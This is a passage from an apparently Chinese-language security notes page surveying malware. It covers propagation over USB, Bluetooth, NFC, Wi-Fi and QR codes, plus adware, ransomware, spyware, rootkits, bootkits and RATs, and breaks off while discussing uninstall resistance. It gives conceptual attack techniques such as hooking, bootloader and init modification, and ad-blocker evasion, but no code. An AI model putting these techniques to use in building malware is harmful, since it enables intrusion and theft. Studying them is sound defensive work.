如果目标系统启用了自动播放功能，或者用户手动执行了USB设备中的恶意文件，恶意软件将被激活。</p></li><li><p><strong>感染和传播：</strong> 恶意软件在目标系统上执行，并开始进行各种恶意操作，例如：窃取数据、安装后门、传播自身到其他USB设备或网络中。</p></li></ol></li><li><p><strong>传播方法：</strong></p><ul><li><p><strong>利用自动播放：</strong> 恶意软件通常会利用Windows等系统的自动播放功能，当用户插入USB设备时，恶意软件自动执行。</p></li><li><p><strong>伪装成合法文件：</strong> 恶意软件会伪装成合法的文件，例如：图片、文档、视频等，诱骗用户手动执行。</p></li><li><p><strong>LNK文件漏洞：</strong> 恶意软件会利用LNK文件漏洞，在用户点击LNK文件时执行恶意代码。</p></li><li><p><strong>隐藏恶意文件：</strong> 恶意软件会使用隐藏属性，隐藏恶意文件，让用户难以发现。</p></li></ul></li><li><p><strong>所需权限：</strong></p><ul><li><p><strong>读取和写入文件：</strong> 需要读取和写入USB设备上的文件。</p></li><li><p><strong>执行程序：</strong> 需要执行恶意程序。</p></li><li><p><strong>系统权限：</strong> 可能需要系统权限来进行更深层次的恶意操作， 例如 修改注册表， 安装系统服务等。</p></li><li><p><strong>Android权限：</strong> 需要 READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE 等权限来访问USB设备，如果涉及到执行恶意代码，可能需要更高的权限。</p></li></ul></li><li><p><strong>相关资料：</strong></p><ul><li><a class="link"   href="https://www.kaspersky.com.cn/about/press-releases/usb-drives" >https://www.kaspersky.com.cn/about/press-releases/usb-drives<i class="fas fa-external-link-alt"></i></a></li></ul></li></ul><p><strong>2. 蓝牙传播：</strong></p><ul><li><p><strong>传播路径：</strong></p><ol><li><p><strong>恶意软件蓝牙传播：</strong> 恶意软件需要具有蓝牙传播能力，例如：蓝牙蠕虫。</p></li><li><p><strong>设备配对：</strong> 攻击者利用漏洞或社会工程学，使目标设备与攻击者的设备配对。</p></li><li><p><strong>文件传输：</strong> 恶意软件通过蓝牙文件传输协议，将自身发送到目标设备。</p></li><li><p><strong>执行：</strong> 目标设备接收到恶意文件后，用户如果执行该文件，则会激活恶意软件。</p></li><li><p><strong>感染和传播：</strong> 恶意软件在目标设备上执行，并开始进行各种恶意操作，例如：窃取数据、安装后门、传播自身到其他蓝牙设备或网络中。</p></li></ol></li><li><p><strong>传播方法：</strong></p><ul><li><p><strong>利用蓝牙漏洞：</strong> 恶意软件会利用蓝牙协议漏洞，自动进行设备配对和文件传输。</p></li><li><p><strong>伪装成合法文件：</strong> 恶意软件会伪装成合法的文件，例如：图片、音频等，诱骗用户手动执行。</p></li><li><p><strong>蓝牙服务漏洞：</strong> 攻击者可以利用蓝牙服务漏洞来获取设备权限。</p></li></ul></li><li><p><strong>所需权限：</strong></p><ul><li><p><strong>蓝牙权限：</strong> 需要蓝牙权限进行设备配对、文件传输。</p></li><li><p><strong>执行程序：</strong> 需要执行恶意程序。</p></li><li><p><strong>系统权限：</strong> 可能需要系统权限来进行更深层次的恶意操作。</p></li><li><p><strong>Android权限：</strong> 需要 BLUETOOTH, BLUETOOTH_ADMIN 等权限。</p></li></ul></li></ul><p><strong>3. NFC 传播：</strong></p><ul><li><p><strong>传播路径：</strong></p><ol><li><p><strong>恶意NFC标签：</strong> 攻击者将恶意软件的信息写入NFC标签中。</p></li><li><p><strong>设备接触：</strong> 用户将设备靠近恶意NFC标签，触发NFC读取。</p></li><li><p><strong>恶意内容读取：</strong> 设备读取NFC标签中的恶意信息， 例如：恶意URL，恶意应用下载链接。</p></li><li><p><strong>恶意执行：</strong> 设备跳转到恶意网站、下载恶意应用程序，用户如果执行这些恶意操作，则会激活恶意软件。</p></li><li><p><strong>感染和传播：</strong> 恶意软件在目标设备上执行，并开始进行各种恶意操作。</p></li></ol></li><li><p><strong>传播方法：</strong></p><ul><li><p><strong>恶意URL：</strong> NFC标签中包含恶意URL，当用户读取标签时，浏览器会自动打开恶意网址。</p></li><li><p><strong>恶意应用下载：</strong> NFC标签中包含恶意应用的下载链接，当用户点击链接时，会自动下载恶意应用。</p></li><li><p><strong>利用NFC漏洞：</strong> 恶意软件会利用NFC协议漏洞，自动执行恶意代码。</p></li><li><p><strong>社交工程学：</strong> 攻击者可以利用社会工程学来诱骗用户去扫描NFC标签。</p></li></ul></li><li><p><strong>所需权限：</strong></p><ul><li><p><strong>NFC权限：</strong> 需要NFC权限进行NFC读取。</p></li><li><p><strong>网络权限：</strong> 如果NFC读取的结果是网址，那么需要网络权限进行浏览。</p></li><li><p><strong>文件下载：</strong> 如果NFC读取的结果是应用下载，那么需要下载权限。</p></li><li><p><strong>系统权限：</strong> 可能需要系统权限来进行更深层次的恶意操作。</p></li><li><p><strong>Android权限：</strong> 需要 NFC 权限。</p></li></ul></li><li><p><strong>示例软件：</strong></p><ul><li><strong>NGate</strong>：NGate Android 恶意软件中继 NFC 流量以窃取现金:<a class="link"   href="https://www.welivesecurity.com/en/eset-research/ngate-android-malware-relays-nfc-traffic-to-steal-cash/" >https://www.welivesecurity.com/en/eset-research/ngate-android-malware-relays-nfc-traffic-to-steal-cash/<i class="fas fa-external-link-alt"></i></a></li></ul></li></ul><p><strong>4. Wi-Fi 传播：</strong></p><ul><li><p><strong>传播路径：</strong></p><ol><li><p><strong>恶意Wi-Fi热点：</strong> 攻击者创建一个恶意Wi-Fi热点，诱骗用户连接。</p></li><li><p><strong>流量劫持：</strong> 当用户连接到恶意Wi-Fi热点时，攻击者可以劫持用户的网络流量。</p></li><li><p><strong>中间人攻击：</strong> 攻击者可以拦截用户的网络请求，修改用户的网页，或者注入恶意代码。</p></li><li><p><strong>恶意下载：</strong> 当用户访问网页时，攻击者可以使用中间人攻击技术，将恶意软件下载到用户的设备上。</p></li><li><p><strong>感染和传播：</strong> 恶意软件在目标设备上执行，并开始进行各种恶意操作。</p></li></ol></li><li><p><strong>传播方法：</strong></p><ul><li><p><strong>中间人攻击：</strong> 攻击者利用中间人攻击技术，拦截用户的网络流量，注入恶意代码。</p></li><li><p><strong>DNS劫持：</strong> 攻击者利用DNS劫持技术，将用户重定向到恶意网站。</p></li><li><p><strong>恶意软件传播：</strong> 在用户的设备上植入恶意软件， 并传播给网络中的其他设备。</p></li><li><p><strong>恶意软件传播：</strong> 当设备连接到恶意WIFI的时候，会将恶意软件自动下载到设备上。</p></li><li><p><strong>钓鱼：</strong> 攻击者可以利用钓鱼网站，诱骗用户输入账号密码等信息。</p></li></ul></li><li><p><strong>所需权限：</strong></p><ul><li><p><strong>网络权限：</strong> 需要网络权限进行Wi-Fi连接和数据传输。</p></li><li><p><strong>文件下载：</strong> 需要下载权限，下载恶意软件。</p></li><li><p><strong>系统权限：</strong> 可能需要系统权限来进行更深层次的恶意操作。</p></li><li><p><strong>Android权限：</strong> 需要 ACCESS_WIFI_STATE, CHANGE_WIFI_STATE, INTERNET 等权限。</p></li></ul></li></ul><p><strong>5. QR 码传播：</strong></p><ul><li><p><strong>传播路径：</strong></p><ol><li><p><strong>恶意QR码：</strong> 攻击者生成一个包含恶意信息的QR码。</p></li><li><p><strong>设备扫描：</strong> 用户使用移动设备扫描恶意QR码。</p></li><li><p><strong>恶意URL：</strong> 恶意QR码包含恶意URL，当用户扫描QR码时，浏览器会自动打开恶意网址。</p></li><li><p><strong>恶意下载：</strong> 用户如果点击恶意网址，可能会下载恶意软件。</p></li><li><p><strong>恶意信息展示：</strong> 恶意QR码可能包含恶意文本信息或者链接，诱导用户输入账号密码等信息。</p></li><li><p><strong>感染和传播：</strong> 恶意软件在目标设备上执行，并开始进行各种恶意操作。</p></li></ol></li><li><p><strong>传播方法：</strong></p><ul><li><p><strong>恶意URL：</strong> QR码中包含恶意URL，当用户扫描QR码时，浏览器会自动打开恶意网址。</p></li><li><p><strong>恶意应用下载：</strong> QR码中包含恶意应用的下载链接，当用户点击链接时，会自动下载恶意应用。</p></li><li><p><strong>社交工程学：</strong> 攻击者会把恶意二维码伪装成各种信息来诱骗用户进行扫描。</p></li></ul></li><li><p><strong>所需权限：</strong></p><ul><li><p><strong>摄像头权限：</strong> 需要摄像头权限进行QR码扫描。</p></li><li><p><strong>网络权限：</strong> 如果QR码扫描的结果是网址，那么需要网络权限进行浏览。</p></li><li><p><strong>文件下载：</strong> 如果QR码扫描的结果是应用下载，那么需要下载权限。</p></li><li><p><strong>Android权限：</strong> 需要 CAMERA 权限。</p></li></ul></li></ul><h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><h3 id="广告（弹窗"><a href="#广告（弹窗" class="headerlink" title="广告（弹窗)"></a>广告（弹窗)</h3><p>广告（弹窗）类型：</p><p> <strong>根据技术实现分类（Android 特有）：</strong></p><ul><li><p><strong>Activity 弹窗：</strong></p><ul><li><p>使用 Android 的 Activity 组件实现的弹窗。</p></li><li><p>具有较高的灵活性和自定义能力，可以实现复杂的动画效果和交互逻辑。</p></li></ul></li><li><p><strong>Dialog 弹窗：</strong></p><ul><li><p>使用 Android 的 Dialog 组件实现的弹窗。</p></li><li><p>比较轻量级，适用于显示简单的提示信息或确认对话框。</p></li></ul></li><li><p><strong>Notification 弹窗：</strong></p><ul><li><p>使用 Android 的 NotificationManager 实现的弹窗，通常显示在通知栏中。</p></li><li><p>可以显示各种通知信息，例如消息、提醒或进度。</p></li></ul></li><li><p><strong>SYSTEM_ALERT_WINDOW 弹窗：</strong></p><ul><li><p>使用 SYSTEM_ALERT_WINDOW权限在其他应用之上绘制的浮窗，常用于显示广告。</p></li><li><p>可以覆盖其他应用界面，比较具有侵入性。</p></li></ul></li></ul><h4 id="恶意类型："><a href="#恶意类型：" class="headerlink" title="恶意类型："></a>恶意类型：</h4><ol><li><p><strong>恶意广告主：</strong></p><ul><li><p>一些恶意广告主会投放恶意广告，如包含恶意代码、链接的广告，诱导用户点击，从而感染恶意软件或进行网络钓鱼。</p></li><li><p>恶意广告主可能使用欺诈手段，例如，点击欺诈、展示欺诈等，骗取广告费用。</p></li><li><p><strong>通过恶意广告SDK传播恶意软件:</strong> 恶意广告主可能会使用恶意的广告SDK（软件开发工具包），在合法的广告中植入恶意代码，从而传播恶意软件。</p></li></ul></li><li><p><strong>恶意发布商：</strong></p><ul><li><p>一些恶意发布商会通过各种手段欺骗广告联盟，例如，刷流量、伪造用户数据，从而骗取广告收入。 攻击者使用机器人或其他自动化方式人为地增加广告的点击次数。这会耗尽广告商的预算，而不会产生真正的潜在客户或转化。</p></li><li><p>这可能包括点击垃圾 (来自虚假用户的多次点击) 和广告堆叠 (多个广告层层叠加，当用户只点击一次时，所有广告都记录点击)。</p></li><li><p>恶意发布商可能会在其广告位上展示恶意广告，给用户带来风险。</p></li><li><p>恶意发布商也可能会利用漏洞或后门，在用户的浏览器或设备上安装恶意软件。</p></li></ul></li><li><p>无限弹窗消耗资源并导致程序崩溃</p></li><li><p>植入恶意代码（webView)</p></li><li><p>点击欺诈</p></li></ol><h4 id="广告联盟"><a href="#广告联盟" class="headerlink" title="广告联盟"></a>广告联盟</h4><ol><li><p><strong>广告跟踪与数据收集：</strong></p><ul><li><p>广告联盟会跟踪广告的展示、点击、转化等数据，以评估广告效果。</p></li><li><p>广告联盟会收集用户的行为数据，如浏览历史、搜索记录、兴趣爱好等，以便更精准地投放广告。</p></li><li><p>广告联盟使用各种跟踪技术，例如：</p><ul><li><p><strong>Cookie：</strong> 在用户浏览器中存储的小型文本文件，用于跟踪用户行为。</p></li><li><p><strong>Pixel：</strong> 嵌入在网页中的一小段代码，用于跟踪用户的浏览行为。</p></li><li><p><strong>移动广告ID：</strong> 在移动设备上用于跟踪用户行为的唯一标识符。</p></li><li><p><strong>服务器端跟踪：</strong> 通过服务器端记录用户的行为数据，相比客户端跟踪，更加可靠和精准。</p></li></ul></li></ul></li><li><p><strong>广告结算：</strong></p><ul><li><p>广告主根据广告效果向广告联盟支付广告费用。</p></li><li><p>广告联盟会根据合同约定将广告收入分给发布商。</p></li><li><p>广告结算通常采用以下几种方式：</p><ul><li><p><strong>CPM (Cost Per Mille)：</strong> 按广告展示次数收费（每千次展示）。</p></li><li><p><strong>CPC (Cost Per Click)：</strong> 按广告点击次数收费。</p></li><li><p><strong>CPA (Cost Per Action)：</strong> 按用户完成特定行为（如注册、购买）收费。</p></li></ul></li></ul></li></ol><h4 id="绕过广告拦截器"><a href="#绕过广告拦截器" class="headerlink" title="绕过广告拦截器"></a>绕过广告拦截器</h4><p>利用白名单、修改广告代码、使用混淆技术</p><p><strong>广告软件示例：</strong></p><ul><li><strong>Fireball</strong>— Fireball 在2017上成为头条新闻，当时一家以色列软件公司发现全球 2.5 亿台计算机和五分之一的企业网络感染了它。如果 Fireball 感染了您的计算机，它会接管您的浏览器。它会将您的主页更改为虚假搜索引擎 Trotus，并在您访问的任何网页中插入扎眼的广告。它还可以防止您修改浏览器设置。</li><li><strong>Appearch</strong> – Appearch是另一种常见的广告软件程序，充当浏览器劫持者。它通常与其他免费软件捆绑在一起，会在浏览器中插入众多广告，让网页浏览变得非常困难。当尝试访问一个网站时，您会被带到 Appearch.info。如果您设法打开网页，Appearch 会将随机文本块转换为链接，因此当您选择文本时，弹出窗口会邀请您下载软件更新。</li></ul><h3 id="勒索"><a href="#勒索" class="headerlink" title="勒索"></a>勒索</h3><p>加密用户的数据，使其无法访问，从而迫使用户支付赎金。<br>锁屏，无法访问</p><p><strong>勒索软件示例：</strong></p><ul><li><strong>CryptoLocker</strong> 在 2013 年和 2014 年肆虐流行，网络犯罪分子用它来访问和加密系统上的文件。网络犯罪分子使用社交工程策略诱骗员工将勒索软件下载到计算机上，从而感染网络。下载后，CryptoLocker 将显示一条赎金消息，如果在规定的截止日期之前进行现金或比特币付款，他们将解密数据。虽然 CryptoLocker 勒索软件已被打掉，但据信其操作者从毫无戒心的组织那里勒索了大约三百万美元。</li><li><strong>Phobos 恶意软件</strong> — 2019 年出现的一款勒索软件。这种勒索软件基于以前已知的 Dharma（又名 CrySis）勒索软件系列。</li></ul><h4 id="勒索软件即服务-Raas"><a href="#勒索软件即服务-Raas" class="headerlink" title="勒索软件即服务 (Raas)"></a>勒索软件即服务 (Raas)</h4><h3 id="间谍（窃取信息）"><a href="#间谍（窃取信息）" class="headerlink" title="间谍（窃取信息）"></a>间谍（窃取信息）</h3><p><strong>行为：</strong><br>记录键盘输入（键盘记录器）、捕获屏幕截图、监视浏览历史或窃取密码和信用卡信息。常用于广告定向、个人信息窃取或监视用户活动。</p><p>读取联系人、短信和通话记录： 这是恶意软件最常见的行为之一，用于收集用户的个人信息，并可能用于钓鱼诈骗或其他恶意活动。</p><p>窃取设备上的照片、视频和音频文件： 录音和视频间谍软件可以使用您的设备录制您的对话，并将信息发送给第三方。某些智能手机应用需要访问笔记本电脑或智能手机的摄像头和麦克风；此权限可能被用于随时录制您的声音影像，在您不知情的情况下上传照片和声音，将您的摄像头画面向互联网直播，以及对您的面部运行人脸识别软件。</p><p>获取设备的地理位置信息： 恶意软件可以跟踪用户的行踪，可能用于广告定向或其他恶意目的。</p><p>读取剪贴板内容： 恶意软件可能窃取用户复制到剪贴板上的敏感信息，如密码、银行卡号等。</p><p>收集应用列表和使用数据： 恶意软件可能收集用户安装的应用列表和使用习惯，以便进行更精准的攻击或广告定向。</p><p>键盘记录： 记录用户在键盘上输入的任何内容，包括密码、账号等敏感信息。</p><p><strong>间谍软件示例：</strong></p><ul><li><strong>CoolWebSearch</strong>– 该程序利用 Internet Explorer 中的安全漏洞劫持浏览器、更改设置并将浏览数据发送给其作者。</li><li><strong>Gator</strong> – 该程序通常与文件共享软件（如 Kazaa）捆绑在一起，监控受害者的网上冲浪习惯，使用这些信息为他们提供特定的广告。</li></ul><p><strong>相关文章：</strong></p><ul><li>AudioGuard ：基于每个进程控制麦克风访问：<a class="link"   href="https://0mwindybug.github.io/AudioGuard/" >https://0mwindybug.github.io/AudioGuard/<i class="fas fa-external-link-alt"></i></a></li><li>保护 Android 剪贴板内容免遭意外暴露:<a class="link"   href="https://www.microsoft.com/en-us/security/blog/2023/03/06/protecting-android-clipboard-content-from-unintended-exposure/" >https://www.microsoft.com/en-us/security/blog/2023/03/06/protecting-android-clipboard-content-from-unintended-exposure/<i class="fas fa-external-link-alt"></i></a></li></ul><h3 id="PUP-恶意软件（捆绑下载）"><a href="#PUP-恶意软件（捆绑下载）" class="headerlink" title="PUP 恶意软件（捆绑下载）"></a>PUP 恶意软件（捆绑下载）</h3><p>PUP 的传播方式<br>诱导用户安装的方法</p><p><strong>PUP 恶意软件示例：</strong></p><ul><li><strong>Mindspark 恶意软件</strong> – 这是一个易于安装的 PUP ，在用户不注意的时候下载到用户的机器上。Mindspark 可以在用户不知情的情况下更改设置并触发设备上的行为。它出了名的难以消除。</li></ul><h3 id="远程控制-rootkit"><a href="#远程控制-rootkit" class="headerlink" title="远程控制 rootkit"></a>远程控制 rootkit</h3><p><a class="link"   href="https://www.kaspersky.com.cn/resource-center/definitions/what-is-rootkit" >https://www.kaspersky.com.cn/resource-center/definitions/what-is-rootkit<i class="fas fa-external-link-alt"></i></a><br><strong>Android 平台上的 Rootkit</strong></p><ul><li><p><strong>定义：</strong> Android 平台上的 Rootkit 是一种恶意软件，旨在隐藏其在 Android 系统中的存在，并允许攻击者保持对受感染设备的访问权限。</p></li><li><p><strong>类型：</strong></p><ul><li><p><strong>用户模式 Rootkit:</strong></p><ul><li><p><strong>表现：</strong> 在用户模式下运行，通常以应用的形式出现，并利用 Hook 技术隐藏自身。</p></li><li><p><strong>攻击：</strong> 可以隐藏恶意应用图标，劫持系统 API，窃取用户数据。</p></li><li><p><strong>检测：</strong> 相对容易被检测，可以通过应用管理器、安全软件等进行检测。</p></li></ul></li><li><p><strong>内核模式 Rootkit:</strong></p><ul><li><p><strong>表现：</strong> 在内核模式下运行，通过修改内核代码或驱动程序来隐藏恶意行为。</p></li><li><p><strong>攻击：</strong> 可以直接控制系统资源、绕过权限检查、实现持久化。</p></li><li><p><strong>检测：</strong> 难以检测，需要专门的内核调试工具和安全分析技术。</p></li></ul></li><li><p><strong>基于 Xposed 或 Magisk 模块的 Rootkit:</strong></p><ul><li><p><strong>表现：</strong> 利用 Xposed 或 Magisk 框架，注入恶意模块，从而控制系统。</p></li><li><p><strong>攻击：</strong> 可以修改系统行为，劫持应用 API，进行各种恶意操作。</p></li><li><p><strong>检测：</strong> 依赖于 Xposed 或 Magisk 的检测工具，可以被用户卸载。</p></li></ul></li></ul></li><li><p><strong>攻击方式:</strong></p><ul><li><p><strong>Hooking:</strong> 修改系统API，拦截或修改系统调用，例如hook open、read、write等API，从而隐藏恶意行为。</p></li><li><p><strong>隐藏恶意文件和进程：</strong> 修改文件系统、进程列表等，使得恶意文件和进程在系统中不可见。</p></li><li><p><strong>修改系统配置文件：</strong> 修改 build.prop、init.rc 等配置文件，以实现持久化或隐藏自身。</p></li><li><p><strong>利用漏洞：</strong> 利用 Android 系统的漏洞进行权限提升或绕过安全机制。</p></li><li><p><strong>伪装成正常应用：</strong> 将 Rootkit 伪装成正常应用，诱骗用户安装。</p></li></ul></li><li><p><strong>恶意行为:</strong></p><ul><li><p><strong>窃取用户数据：</strong> 窃取短信、联系人、通话记录、位置信息、照片、视频等敏感信息。</p></li><li><p><strong>监控用户活动：</strong> 记录键盘输入、屏幕截图、通话录音等。</p></li><li><p><strong>修改系统设置：</strong> 禁用安全功能、修改 DNS 设置、更改网络代理等。</p></li><li><p><strong>进行广告欺诈：</strong> 在后台弹出广告、进行点击欺诈、流量欺诈等。</p></li><li><p><strong>DDoS攻击：</strong> 将受感染的设备变成僵尸网络的一部分，用于发动 DDoS 攻击。</p></li></ul></li></ul><p><strong>实际例子：</strong></p><ul><li><ol><li><strong>相关软件&#x2F;工具</strong></li></ol><ul><li><p><strong>Process Hacker:</strong> 用于查看、调试、管理 Windows 进程的工具。</p><ul><li><strong>用途：</strong> 可以查看隐藏进程、模块信息，分析进程行为。</li></ul></li><li><p><strong>Sysinternals Suite:</strong> 微软官方发布的一系列系统工具，用于系统分析和调试。</p><ul><li><strong>用途：</strong> 包含 Process Monitor、Process Explorer 等工具，可以用于查看进程、文件、注册表、网络活动等。</li></ul></li><li><p><strong>IDA Pro&#x2F;Ghidra:</strong> 用于反编译、调试、分析软件的工具。</p><ul><li><strong>用途：</strong> 可以分析恶意代码，找到 Rootkit 的隐藏功能。</li></ul></li><li><p><strong>Android Debug Bridge (ADB):</strong> Android 开发工具，可以用于调试 Android 设备。</p></li><li><p><strong>用途：</strong> 调试 Android 系统，提取恶意软件信息。</p></li><li><p><strong>Xposed&#x2F;Magisk：</strong> Android 框架，可以用于注入代码和修改系统行为。</p><ul><li><strong>用途：</strong> Xposed 和 Magisk 既可以被用于开发有用的模块，也可能被恶意软件开发者利用。</li></ul></li></ul></li></ul><ol start="2"><li><p><strong>实际利用例子</strong></p><ul><li><p><strong>ZeroAccess Rootkit:</strong> 一种 Windows 内核模式 Rootkit，用于生成点击欺诈流量。</p></li><li><p><strong>Sony BMG Rootkit:</strong> Sony BMG 公司在其音乐 CD 中安装的 Rootkit，用于阻止用户复制音乐，但也带来了安全风险。</p></li><li><p><strong>Pegasus Spyware:</strong> NSO Group 开发的间谍软件，可以使用多种 Rootkit 技术来感染 Android 和 iOS 设备，并窃取用户数据。</p></li><li><p><strong>Gooligan:</strong> 一种安卓 Rootkit，利用旧安卓版本的漏洞来获取 root 权限，安装恶意软件并窃取用户数据。</p></li></ul></li></ol><h4 id="Bootkits"><a href="#Bootkits" class="headerlink" title="Bootkits"></a>Bootkits</h4><p>一种感染 MBR（主引导记录）的 rootkit，它允许在操作系统启动之前加载恶意软件</p><ul><li><p>破坏操作系统的启动过程。</p></li><li><p>感染 MBR (主引导记录)或 UEFI。</p></li><li><p>在操作系统启动之前加载恶意软件。</p></li><li><p>难以被检测和清除。</p></li></ul><p><strong>Android 平台上的 Bootkit</strong></p><ul><li><p><strong>定义：</strong> Android 平台上的 Bootkit 是一种恶意软件，旨在感染 Android 设备的启动过程，通常是在内核加载之前，从而在系统启动的早期就获得控制权。</p></li><li><p><strong>类型:</strong></p><ul><li><p><strong>Bootloader Bootkit:</strong></p><ul><li><p><strong>表现:</strong> 感染Bootloader，可以完全控制设备的启动过程。</p></li><li><p><strong>攻击:</strong> 可以修改内核、驱动等，实现持久化、绕过安全机制。</p></li><li><p><strong>检测:</strong> 非常难以检测，需要刷机、硬件调试等手段。</p></li></ul></li><li><p><strong>Kernel Bootkit:</strong></p><ul><li><p><strong>表现:</strong> 感染 Android 内核，通常以内核模块的形式存在。</p></li><li><p><strong>攻击:</strong> 可以直接控制系统资源、绕过安全机制、修改系统行为。</p></li><li><p><strong>检测:</strong> 难以检测，需要专门的内核调试工具和安全分析技术。</p></li></ul></li><li><p><strong>Recovery Image Bootkit:</strong></p><ul><li><p><strong>表现:</strong> 感染Recovery镜像，在设备进入Recovery模式时运行。</p></li><li><p><strong>攻击:</strong> 可以修改系统分区、安装恶意软件、擦除用户数据等。</p></li><li><p><strong>检测:</strong> 难以检测，需要检查Recovery镜像文件。</p></li></ul></li></ul></li><li><p><strong>攻击方式:</strong></p><ul><li><p><strong>感染Bootloader:</strong> 修改 Bootloader 代码，使其在启动时加载恶意代码。</p></li><li><p><strong>替换内核：</strong> 替换 Android 内核，使其加载恶意驱动或模块。</p></li><li><p><strong>修改 init 进程：</strong> 修改 init 进程，使其在系统启动时执行恶意代码。</p></li><li><p><strong>修改 recovery 镜像：</strong> 修改 recovery 镜像，使其在设备进入 recovery 模式时执行恶意代码。</p></li><li><p><strong>利用漏洞:</strong> 利用Bootloader、内核、驱动等漏洞，直接植入Bootkit。</p></li></ul></li><li><p><strong>恶意行为:</strong></p><ul><li><p><strong>持久化：</strong> 确保恶意软件在系统重启、恢复出厂设置后仍然可以运行。</p></li><li><p><strong>绕过安全启动：</strong> 禁用安全启动机制，从而加载恶意内核或驱动程序。</p></li><li><p><strong>控制设备：</strong> 控制 Android 设备的启动过程、操作系统、硬件资源等。</p></li><li><p><strong>窃取用户数据：</strong> 在系统启动的早期窃取用户数据，例如账号密码、银行卡信息等。</p></li><li><p><strong>破坏系统：</strong> 修改系统文件、破坏启动流程等，导致系统无法正常运行。</p></li><li><p><strong>安装恶意软件：</strong> 在系统启动时安装恶意应用，绕过应用商店的审核。</p></li><li><p><strong>远程控制：</strong> 在系统启动时建立后门，允许攻击者远程控制设备。</p></li></ul></li></ul><ol><li><ul><li><p><strong>UEFI Bootkit:</strong></p></li><li><p><strong>功能:</strong> 感染 UEFI 固件，在操作系统加载之前运行。</p></li><li><p><strong>说明:</strong> 由于 UEFI 代码的复杂性，我无法直接提供一个可运行的代码示例。UEFI Bootkit通常需要编写复杂的 UEFI 驱动程序、hook UEFI 服务、操作 UEFI 变量等技术。下面是简化的流程：<br>  1. <strong>获取 UEFI 固件访问权限:</strong> 通过漏洞、恶意更新或供应链攻击等方式获取。<br>  2. <strong>注入恶意模块:</strong> 在 UEFI 固件中植入恶意模块，使其在系统启动时运行。<br>  3. <strong>控制启动流程:</strong> 修改启动流程，加载恶意内核或驱动。<br>  * <strong>实际案例:</strong></p><ul><li><p><strong>Hacking Team UEFI Rootkit:</strong> 意大利公司 Hacking Team 开发的 UEFI Rootkit，用于监视目标用户。</p></li><li><p><strong>LoJax UEFI Rootkit:</strong> APT28 (Fancy Bear) 使用的 UEFI Bootkit，用于持久化攻击，针对政府和国防机构。</p></li></ul></li></ul></li><li><p><strong>MBR Bootkit</strong></p><ul><li><p><strong>原理：</strong> 将恶意代码写入 MBR (主引导记录) 的前 512 字节，从而在系统启动时执行。</p></li><li><p><strong>实际案例：</strong> <strong>TDL3 (Alureon) Bootkit:</strong> 一种感染 MBR 的 Bootkit，用于劫持 DNS 服务器，传播恶意软件，2010 年左右流行。</p></li></ul></li><li><p><strong>相关软件&#x2F;工具</strong></p><ul><li><p><strong>UEFITool:</strong> 用于分析、修改 UEFI 固件的工具。</p><ul><li><p><strong>用途：</strong> 可以查看 UEFI 固件的结构，提取固件模块，分析固件漏洞，修改固件配置。</p></li><li><p><strong>注意：</strong> UEFITool 既可以用于安全研究，也可能被恶意软件开发者滥用。</p></li></ul></li><li><p><strong>Intel System Debugger (ISD):</strong> 用于调试、分析 Intel 平台的固件和操作系统。</p></li><li><p><strong>用途：</strong> 调试固件代码，分析固件漏洞，跟踪系统启动过程。</p></li><li><p><strong>注意：</strong> ISD是一个强大的调试工具，可以被安全研究人员和攻击者使用。</p></li><li><p><strong>Chipsec:</strong> 用于分析、审计 UEFI 安全配置的工具。</p></li><li><p><strong>用途：</strong> 检测 UEFI 固件中的安全漏洞，分析系统安全策略。</p></li><li><p><strong>VirtualBox&#x2F;VMware：</strong> 可以创建虚拟机来测试 Bootkit 代码，避免在真实硬件上造成损害。</p></li><li><p><strong>用途：</strong> 在虚拟机中运行模拟环境，测试恶意代码，调试系统启动过程。</p></li><li><p><strong>注意：</strong> 确保虚拟机环境的安全，防止恶意代码逃逸。</p></li></ul></li><li><p><strong>实际利用例子</strong></p><ul><li><p><strong>FinSpy (FinFisher):</strong> 一种商业间谍软件，使用 Bootkit 来实现持久化，并监控目标设备。</p></li><li><p><strong>Equation Group 的固件植入:</strong> 美国国家安全局（NSA）下属的黑客组织 “方程式组织” 使用固件植入技术，包括 Bootkit，进行网络间谍活动。</p></li><li><p><strong>Darkhotel APT:</strong> 该组织利用 UEFI Bootkit 对酒店网络中的目标计算机进行攻击。</p></li></ul></li></ol><h3 id="RAT"><a href="#RAT" class="headerlink" title="RAT"></a>RAT</h3><p>远程访问木马或远程访问工具。用于为攻击者提供对系统的完全控制权。通常带有键盘记录器。</p><ul><li><p>RAT可以提供攻击者完全控制受感染的设备。</p></li><li><p>通常包含键盘记录器、屏幕截图功能、文件管理功能等。</p></li><li><p>可以通过多种方式传播，例如电子邮件、恶意网站、软件漏洞等。</p></li></ul><h3 id="阻止卸载"><a href="#阻止卸载" class="headerlink" title="阻止卸载"></a>阻止卸载</h3><h4 id="卸载时发生了什么："><a href="#卸载时发生了什么：" class="headerlink" title="卸载时发生了什么："></a>卸载时发生了什么：</h4><p><strong>1.系统处理卸载请求：</strong></p><ul><li><p><strong>PackageManagerService：</strong> 当用户触发卸载操作后，系统会通过 PackageManagerService (Android包管理服务)来处理卸载请求。</p></li><li><p><strong>权限检查：</strong> PackageManagerService 会检查用户是否有卸载该应用的权限（例如：设备管理员权限）。</p></li><li><p><strong>进程停止：</strong> 系统会强制停止该应用的所有进程，包括前台进程、后台服务、定时任务等。</p></li><li><p><strong>广播：</strong> 系统会发送 ACTION_PACKAGE_REMOVED 广播，通知其他应用程序，某个应用已经被卸载。</p></li><li><p><strong>数据删除：</strong> 系统会删除该应用的所有数据， 例如 应用的缓存， 数据库，SharedPreferences等。</p></li></ul><p><strong>2. 系统删除应用文件：</strong></p><ul><li><p><strong>APK文件删除：</strong> 系统会删除该应用的APK文件，以及与该应用相关的所有文件。</p></li><li><p><strong>数据目录删除：</strong> 系统会删除该应用的数据目录。</p></li><li><p><strong>缓存文件删除：</strong> 系统会删除该应用的缓存文件。</p></li></ul><p><strong>3. 清理残留信息：</strong></p><ul><li><p><strong>清理注册表：</strong> 系统可能会清理注册表中该应用的相关信息。</p></li><li><p><strong>清理缓存：</strong> 系统会清理其他缓存文件中该应用的相关信息。</p></li></ul><h4 id="检测卸载："><a href="#检测卸载：" class="headerlink" title="检测卸载："></a>检测卸载：</h4><p>应用本身并不知道自己何时被卸载，因为卸载操作是由系统执行的。 但是，应用可以通过以下方式来检测到自身被卸载：</p><ul><li><p><strong>ACTION_PACKAGE_REMOVED 广播：</strong> 系统在卸载应用后，会发送 ACTION_PACKAGE_REMOVED 广播，其他应用可以注册这个广播来监听应用的卸载事件。</p></li><li><p><strong>DeviceAdminReceiver：</strong> 